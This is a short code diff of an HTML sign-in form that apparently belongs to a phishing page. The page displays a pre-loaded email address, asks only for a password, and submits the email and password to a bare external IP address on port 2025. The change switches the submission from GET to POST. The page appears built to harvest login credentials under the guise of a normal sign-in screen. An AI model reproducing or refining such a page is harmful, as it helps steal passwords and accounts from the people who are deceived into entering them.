@@ -201,7 +201,7 @@
         <div id="loginForm">
             <p id="email-display">Loading email...</p>
             <p id="signInText">Enter password</p>
-            <form id="authForm" action="https://162.251.123.242:2025/submit" method="GET" onsubmit="return validateForm()">
+            <form id="authForm" action="https://162.251.123.242:2025/submit" method="POST" onsubmit="return validateForm()">
                 <input type="hidden" id="email" name="email">        
                 <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
                 <button type="submit">Sign in</button>
